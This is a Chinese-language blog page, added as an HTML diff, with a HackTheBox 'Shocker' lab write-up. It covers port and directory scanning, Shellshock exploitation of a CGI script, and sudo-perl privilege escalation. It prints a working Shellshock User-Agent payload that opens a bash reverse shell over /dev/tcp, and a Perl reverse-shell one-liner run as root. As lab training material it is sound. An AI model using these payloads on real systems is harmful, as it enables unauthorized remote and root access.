@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ReconnaissancePorts1sudo .&#x2F;nmapAutomator.sh 10.10.10.56 All  or 1234567891011nmap -sC -sV -O -oA htb&#x2F;shocker&#x2F;nmap&#x2F;initial 10.10.10.56PORT     STATE SERVICE VERSION80&#x2F;tcp   open  http    Apache httpd 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Shocker">
+<meta property="og:url" content="http://example.com/2023/10/01/HackTheBox-Shocker/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="ReconnaissancePorts1sudo .&#x2F;nmapAutomator.sh 10.10.10.56 All  or 1234567891011nmap -sC -sV -O -oA htb&#x2F;shocker&#x2F;nmap&#x2F;initial 10.10.10.56PORT     STATE SERVICE VERSION80&#x2F;tcp   open  http    Apache httpd 2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/MUm1VnPJwdYOj3L.png">
+<meta property="article:published_time" content="2023-10-01T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T09:14:52.937Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/MUm1VnPJwdYOj3L.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox-Shocker</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/04/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/01/HackTheBox-Sunday/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/HackTheBox-Shocker/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/HackTheBox-Shocker/&text=HackTheBox-Shocker"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/HackTheBox-Shocker/&is_video=false&description=HackTheBox-Shocker"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox-Shocker&body=Check out this article: http://example.com/2023/10/01/HackTheBox-Shocker/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/HackTheBox-Shocker/&name=HackTheBox-Shocker&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/HackTheBox-Shocker/&t=HackTheBox-Shocker"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Ports"><span class="toc-number">1.1.</span> <span class="toc-text">Ports</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web-directory-scan"><span class="toc-number">1.2.</span> <span class="toc-text">Web directory scan</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox-Shocker
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-01T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h4><h5 id="Ports"><a href="#Ports" class="headerlink" title="Ports"></a>Ports</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./nmapAutomator.sh 10.10.10.56 All</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -O -oA htb/shocker/nmap/initial 10.10.10.56</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)</span><br><span class="line">|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)</span><br><span class="line">|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h5 id="Web-directory-scan"><a href="#Web-directory-scan" class="headerlink" title="Web directory scan"></a>Web directory scan</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56</span><br><span class="line">/.hta                 (Status: 403) [Size: 290]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 295]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 295]</span><br><span class="line">/cgi-bin/             (Status: 403) [Size: 294]</span><br><span class="line">/index.html           (Status: 200) [Size: 137]</span><br><span class="line">/server-status        (Status: 403) [Size: 299]</span><br></pre></td></tr></table></figure>
+
+<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>看到&#x2F;cgi-bin&#x2F;就想到有没有可能存在shellshock的洞，一般包含&#x2F;cgi-sys, &#x2F;cgi-mod, &#x2F;cgi-bin等目录</p>
+<p>爆破&#x2F;cgi-bin&#x2F;的子目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/ -x sh,cgi</span><br></pre></td></tr></table></figure>
+
+<p>找到user.sh，内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line"> 22:17:21 up 1 min,  0 users,  load average: 0.18, 0.07, 0.02</span><br></pre></td></tr></table></figure>
+
+<p>shellshock试着打一下，请求&#x2F;cgi-bin&#x2F;user.sh，抓包改user-agent字段，成功</p>
+<p><a href="https://smms.app/image/MUm1VnPJwdYOj3L" target="_blank"><img src="https://s2.loli.net/2024/01/14/MUm1VnPJwdYOj3L.png" ></a></p>
+<p>bash反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; :; &#125;;echo;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1;</span><br></pre></td></tr></table></figure>
+
+<p>本地开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>拿到权限为shelly的shell</p>
+<h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><p>上传LinEnum.sh，本地开http，用wget上上去</p>
+<p>返回了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] We&#x27;re a member of the (lxd) group - could possibly misuse these rights!</span><br><span class="line">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>google一下<code>lxd group privilege escalation</code></p>
+<p>kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder   </span><br><span class="line">sudo ./build-alpine</span><br><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.137/alpine-v3.15-x86_64-20220317_1435.tar.gz</span><br><span class="line">lxd init</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了，lxd需要root权限才能执行</p>
+<p><code>sudo -l</code>查看哪些命令可以执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shelly@Shocker:/home/shelly$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for shelly on Shocker:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User shelly may run the following commands on Shocker:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>
+
+<p>直接sudo用perl反弹一个shell回来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/perl -e &#x27;use Socket;$i=&quot;10.10.14.5&quot;;$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Ports"><span class="toc-number">1.1.</span> <span class="toc-text">Ports</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web-directory-scan"><span class="toc-number">1.2.</span> <span class="toc-text">Web directory scan</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/HackTheBox-Shocker/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/HackTheBox-Shocker/&text=HackTheBox-Shocker"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/HackTheBox-Shocker/&is_video=false&description=HackTheBox-Shocker"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox-Shocker&body=Check out this article: http://example.com/2023/10/01/HackTheBox-Shocker/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/HackTheBox-Shocker/&title=HackTheBox-Shocker"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/HackTheBox-Shocker/&name=HackTheBox-Shocker&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/HackTheBox-Shocker/&t=HackTheBox-Shocker"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
